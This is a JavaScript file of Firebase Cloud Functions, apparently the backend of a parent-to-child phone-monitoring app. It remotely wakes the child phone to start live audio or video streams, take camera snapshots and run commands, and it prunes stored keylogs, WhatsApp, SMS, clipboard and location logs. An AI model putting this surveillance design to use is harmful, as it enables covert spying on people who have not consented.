const functions = require("firebase-functions");
const admin = require("firebase-admin");

const DB_INSTANCE = "apnasatthilko-default-rtdb";
const DB_URL = "https://apnasatthilko-default-rtdb.asia-southeast1.firebasedatabase.app";
const REGION = "asia-southeast1";

if (!admin.apps.length) {
  admin.initializeApp({
    databaseURL: DB_URL,
    storageBucket: "apnasatthilko.firebasestorage.app"
  });
}

/**
 * Helper: Clean up invalid FCM token from database
 */
async function cleanupInvalidToken(uid) {
  try {
    await admin.database().ref(`/users/${uid}/fcmToken`).remove();
    console.log(`Removed invalid FCM token for user: ${uid}`);
  } catch (err) {
    console.error(`Failed to remove invalid token for ${uid}:`, err);
  }
}

/**
 * Helper: Send FCM message with invalid token handling
 */
async function sendFcmSafe(uid, token, message) {
  try {
    const response = await admin.messaging().send(message);
    return response;
  } catch (err) {
    const code = err.code || err.errorInfo?.code || "";
    if (
      code === "messaging/invalid-registration-token" ||
      code === "messaging/registration-token-not-registered" ||
      code === "messaging/invalid-argument"
    ) {
      console.warn(`Invalid FCM token for ${uid}, removing from DB.`);
      await cleanupInvalidToken(uid);
    } else {
      console.error(`FCM send error for ${uid}:`, err);
    }
    return null;
  }
}

function hasChanged(before, after, fields) {
  if (!before.exists()) return true;
  const previous = before.val() || {};
  const current = after.val() || {};
  return fields.some((field) => previous[field] !== current[field]);
}

const defaultRuntime = {
  memory: "256MB",
  timeoutSeconds: 60,
  minInstances: 0,
  maxInstances: 50
};

/**
 * Realtime Database Trigger: onStreamRequested
 * Triggers on /streams/{targetUid}/status on the correct database instance
 * Sends High-Priority FCM Data Push to wake up Child phone lock-screen.
 */
exports.onStreamRequested = functions
  .region(REGION)
  .runWith(defaultRuntime)
  .database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/status")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const statusData = change.after.val();

    if (!statusData) {
      console.log(`Stream request removed for target: ${targetUid}`);
      return null;
    }

    if (!hasChanged(change.before, change.after, ["status", "streamType", "type", "sessionId"])) {
      return null;
    }

    const status = statusData.status || "";

    // If stream was stopped by parent, notify child to STOP and cleanup signaling session
    if (status === "STOPPED" || status === "DISCONNECTED") {
      const sessionId = statusData.sessionId;
      if (sessionId) {
        admin.database().ref(`/signaling/${sessionId}`).remove().catch((e) => console.error("Error removing signaling session:", e));
      }
      try {
        const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
        const userData = userSnapshot.val();
        if (userData && userData.fcmToken) {
          const stopMsg = {
            token: userData.fcmToken,
            android: { priority: "high", ttl: 0 },
            data: { action: "STOP_STREAM", timestamp: String(Date.now()) }
          };
          await sendFcmSafe(targetUid, userData.fcmToken, stopMsg);
          console.log(`Sent STOP_STREAM FCM push to ${targetUid}`);
        }
      } catch (err) {
        console.error(`Error sending STOP_STREAM to ${targetUid}:`, err);
      }
      return null;
    }

    // Only process when parent explicitly REQUESTED a live stream
    if (status !== "REQUESTED") {
      console.log(`Ignoring status '${status}' for target: ${targetUid}`);
      return null;
    }

    const streamType = (statusData.streamType || statusData.type || "audio").toLowerCase();
    const hasVideo = streamType === "video";
    const sessionId = statusData.sessionId || `session_${targetUid}_${Date.now()}`;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();

      if (!userData || !userData.fcmToken) {
        console.error(`No FCM Token found for user: ${targetUid}`);
        return null;
      }

      const message = {
        token: userData.fcmToken,
        android: {
          priority: "high",
          ttl: 0
        },
        data: {
          action: "START_STREAM",
          streamType: streamType,
          hasVideo: hasVideo ? "true" : "false",
          sessionId: sessionId,
          timestamp: String(Date.now())
        }
      };

      const response = await sendFcmSafe(targetUid, userData.fcmToken, message);
      if (response) {
        console.log(`Successfully sent high-priority FCM push (${streamType}) to ${targetUid}:`, response);
      }
      return response;
    } catch (error) {
      console.error(`Error sending FCM push to ${targetUid}:`, error);
      return null;
    }
  });

/**
 * Realtime Database Trigger: onSnapshotRequested
 * Triggers on /streams/{targetUid}/snapshotRequest
 */
exports.onSnapshotRequested = functions
  .region(REGION)
  .runWith(defaultRuntime)
  .database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/snapshotRequest")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const data = change.after.val();
    if (!data || data.status !== "REQUESTED") return null;
    if (!hasChanged(change.before, change.after, ["status", "cameraFacing", "requestId"])) return null;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: 0 },
          data: {
            action: "WAKEUP",
            type: "SNAPSHOT",
            facing: data.cameraFacing || "back",
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent SNAPSHOT FCM wake-up to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending snapshot FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Realtime Database Trigger: onCommandSent
 * Triggers on /commands/{targetUid}/{command}
 */
exports.onCommandSent = functions
  .region(REGION)
  .runWith(defaultRuntime)
  .database
  .instance(DB_INSTANCE)
  .ref("/commands/{targetUid}/{command}")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const command = context.params.command;
    const data = change.after.val();

    // 1. Ignore deletes
    if (!data) return null;

    // 2. Ignore commands that are turning OFF, cleared, or reset (value is false, empty string, or null)
    const val = typeof data === "object" ? data.value : data;
    if (val === false || val === "" || val === null || val === undefined) {
      console.log(`Ignoring command ${command} turn-off/reset value for ${targetUid}`);
      return null;
    }

    // 3. Deduplication: Only trigger if the actual command value or requestId changed
    // (Never trigger on simple timestamp updates!)
    if (change.before.exists()) {
      const prevData = change.before.val();
      const prevVal = typeof prevData === "object" ? prevData.value : prevData;
      if (prevVal === val && prevData.requestId === data.requestId) {
        console.log(`Ignoring duplicate command ${command} with unchanged value for ${targetUid}`);
        return null;
      }
    }

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: 0 },
          data: {
            action: "WAKEUP",
            type: "COMMAND",
            command: command,
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent COMMAND FCM wake-up (${command}) to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending command FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Realtime Database Trigger: onSecurityAlertCreated
 * Triggers on /alerts/{childUid}/{alertId}
 * Sends High-Priority FCM Push Alert to the Parent phone immediately.
 */
exports.onSecurityAlertCreated = functions
  .region(REGION)
  .runWith(defaultRuntime)
  .database
  .instance(DB_INSTANCE)
  .ref("/alerts/{childUid}/{alertId}")
  .onCreate(async (snapshot, context) => {
    const childUid = context.params.childUid;
    const alert = snapshot.val();
    if (!alert) return null;

    // Charger events database me save honge, lekin parent ke phone par push notification nahi aayega
    if (alert.type === "CHARGER_CONNECTED" || alert.type === "CHARGER_DISCONNECTED") {
      console.log(`Skipping push notification for routine charger event: ${alert.type}`);
      return null;
    }

    try {
      const childSnap = await admin.database().ref(`/users/${childUid}`).once("value");
      const childData = childSnap.val();
      if (!childData || !childData.parentId) {
        console.log(`No parentId found for child: ${childUid}`);
        return null;
      }

      const parentId = childData.parentId;
      const parentSnap = await admin.database().ref(`/users/${parentId}`).once("value");
      const parentData = parentSnap.val();
      if (!parentData || !parentData.fcmToken) {
        console.log(`No FCM token for parent: ${parentId}`);
        return null;
      }

      const childName = childData.displayName || childData.name || "Child Phone";
      const alertTitle = alert.title || `🚨 Security Alert (${childName})`;
      const alertMsg = alert.message || "Security alert detected on device.";

      const message = {
        token: parentData.fcmToken,
        android: {
          priority: "high",
          notification: {
            title: alertTitle,
            body: alertMsg,
            sound: "default",
            channelId: "security_alerts_channel",
            priority: "max"
          }
        },
        data: {
          action: "SECURITY_ALERT",
          childUid: childUid,
          alertType: alert.type || "SIM_CHANGED",
          title: alertTitle,
          message: alertMsg,
          timestamp: String(alert.timestamp || Date.now())
        }
      };

      const response = await sendFcmSafe(parentId, parentData.fcmToken, message);
      console.log(`Successfully sent security alert FCM to parent ${parentId}:`, response);
      return response;
    } catch (err) {
      console.error("Error sending security alert FCM to parent:", err);
      return null;
    }
  });

/**
 * Scheduled Cloud Function: Daily auto-cleanup at 2:00 AM IST
 * Purges old data from Cloud Firestore & RTDB.
 * COST OPTIMIZED: 128MB memory, paginated per-user cleanup (100 users/batch)
 * so even at 1M+ users, never reads full DB tree at once.
 */
exports.cleanupOldData = functions
  .region(REGION)
  .runWith({ memory: "128MB", timeoutSeconds: 540, minInstances: 0 })
  .pubsub
  .schedule("0 2 * * *")
  .timeZone("Asia/Kolkata")
  .onRun(async (context) => {
    console.log("Daily 2:00 AM IST Auto-cleanup started.");
    const startTime = Date.now();
    const ONE_DAY_MS = 24 * 60 * 60 * 1000;
    const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
    const oneDayCutoff = Date.now() - ONE_DAY_MS;
    const cutoffTime = Date.now() - SEVEN_DAYS_MS;
    const firestore = admin.firestore();
    const db = admin.database();

    // 1. Clean up old Notifications & Media Gallery from Cloud Firestore using collectionGroup
    // Scales to 10M users with ZERO full collection scans! Capped at 300 per run.
    try {
      const oldNotifs = await firestore.collectionGroup("items")
        .where("timestamp", "<", oneDayCutoff)
        .limit(300)
        .get();
      if (!oldNotifs.empty) {
        const batch = firestore.batch();
        oldNotifs.docs.forEach((doc) => batch.delete(doc.ref));
        await batch.commit();
        console.log(`Pruned ${oldNotifs.size} expired Firestore items.`);
      }
    } catch (err) {
      console.warn("Firestore collectionGroup cleanup note:", err.message);
    }

    // 2. Prune RTDB history nodes older than 7 days — PAGINATED WITH TIME BUDGET
    // Critical cost optimization: processes in batches and stops before function timeout
    const nodesToPrune = [
      "whatsapp_logs",
      "youtube_history",
      "alerts",
      "call_logs",
      "sms_logs",
      "web_history",
      "network_history",
      "keylogs",
      "wifi_logs",
      "social_media_usage",
      "location_history",
      "clipboard_logs",
      "activity_feed",
      "bluetooth_audit",
      "app_usage"
    ];

    console.log(`Starting paginated cleanup. Cutoff: ${new Date(cutoffTime).toISOString()}`);

    for (const node of nodesToPrune) {
      // Time budget guard: don't exceed 6 minutes of run time
      if (Date.now() - startTime > 360000) {
        console.log("Time budget reached, gracefully pausing RTDB cleanup for remaining nodes.");
        break;
      }
      try {
        const rootRef = db.ref(node);
        let lastKey = null;
        let pagesCount = 0;
        const MAX_PAGES = 15; // 1500 users per node per daily run

        while (pagesCount < MAX_PAGES) {
          pagesCount++;
          let pageQuery = rootRef.orderByKey().limitToFirst(100);
          if (lastKey) pageQuery = rootRef.orderByKey().startAfter(lastKey).limitToFirst(100);

          const childrenSnapshot = await pageQuery.once("value");
          if (!childrenSnapshot.exists()) break;

          const childKeys = [];
          childrenSnapshot.forEach((snap) => { childKeys.push(snap.key); });

          const promises = childKeys.map((childUid) => {
            const userLogsRef = db.ref(`${node}/${childUid}`);
            return userLogsRef
              .orderByChild("timestamp")
              .endAt(cutoffTime)
              .limitToFirst(100)
              .once("value")
              .then((snapshot) => {
                if (!snapshot.exists()) return null;
                const updates = {};
                snapshot.forEach((itemSnap) => { updates[itemSnap.key] = null; });
                return userLogsRef.update(updates);
              })
              .catch((err) => {
                console.error(`Error pruning ${node}/${childUid}:`, err);
              });
          });

          await Promise.all(promises);

          if (childKeys.length < 100) {
            break;
          } else {
            lastKey = childKeys[childKeys.length - 1];
          }
        }
        console.log(`Completed paginated pruning for node: ${node}`);
      } catch (err) {
        console.error(`Failed to prune node ${node}:`, err);
      }
    }

    // 3. Stale WebRTC signaling sessions cleanup — INDEXED QUERY (zero full-tree read)
    try {
      const TWO_HOURS_MS = 2 * 60 * 60 * 1000;
      const signalingCutoff = Date.now() - TWO_HOURS_MS;
      const signalingRef = db.ref("signaling");
      const sigSnap = await signalingRef.orderByChild("timestamp").endAt(signalingCutoff).limitToFirst(300).once("value");
      if (sigSnap.exists()) {
        const sigUpdates = {};
        sigSnap.forEach((item) => { sigUpdates[item.key] = null; });
        await signalingRef.update(sigUpdates);
        console.log(`Cleaned up ${Object.keys(sigUpdates).length} stale signaling sessions.`);
      }
    } catch (err) {
      console.error("Failed to clean up stale signaling sessions:", err);
    }

    // 4. Stale streams cleanup — INDEXED QUERY (zero full-tree read)
    try {
      const ONE_HOUR_MS = 60 * 60 * 1000;
      const streamCutoff = Date.now() - ONE_HOUR_MS;
      const streamsRef = db.ref("streams");
      const streamsSnap = await streamsRef.orderByChild("status/timestamp").endAt(streamCutoff).limitToFirst(200).once("value");
      if (streamsSnap.exists()) {
        const staleUpdates = {};
        streamsSnap.forEach((childSnap) => {
          const val = childSnap.val() || {};
          const statusNode = val.status || {};
          const status = statusNode.status || val.status || "";
          if (status === "STOPPED" || status === "DISCONNECTED" || status === "") {
            staleUpdates[childSnap.key] = null;
          }
        });
        if (Object.keys(staleUpdates).length > 0) {
          await streamsRef.update(staleUpdates);
          console.log(`Cleaned up ${Object.keys(staleUpdates).length} stale stream nodes.`);
        }
      }
    } catch (err) {
      console.error("Failed to clean up stale stream nodes:", err);
    }

    // 5. Cloud Storage 7-Day Retention Cleanup — FREE TIER COMPLIANT (<5GB)
    try {
      let bucket;
      try {
        bucket = admin.storage().bucket();
      } catch (_) {
        bucket = admin.storage().bucket("apnasatthilko.firebasestorage.app");
      }
      const storageCutoff = Date.now() - SEVEN_DAYS_MS;

      const [recFiles] = await bucket.getFiles({ prefix: "recordings/", maxResults: 100, autoPaginate: false }).catch(() => [[]]);
      const [snapFiles] = await bucket.getFiles({ prefix: "snapshots/", maxResults: 100, autoPaginate: false }).catch(() => [[]]);
      const [thumbFiles] = await bucket.getFiles({ prefix: "thumbnails/", maxResults: 100, autoPaginate: false }).catch(() => [[]]);
      const filesToDelete = [
        ...(recFiles || []),
        ...(snapFiles || []),
        ...(thumbFiles || [])
      ];

      let deletedCount = 0;
      await Promise.all(
        filesToDelete
          .filter((file) => Number(new Date(file.metadata.timeCreated || 0)) < storageCutoff)
          .map((file) => {
            deletedCount++;
            return file.delete().catch((err) => console.error("Failed to delete storage file:", file.name, err));
          })
      );
      console.log(`Cloud Storage cleanup: deleted ${deletedCount} files older than 7 days.`);
    } catch (err) {
      console.error("Failed to clean up storage files:", err);
    }

    console.log("Daily cleanup completed successfully.");
    return null;
  });
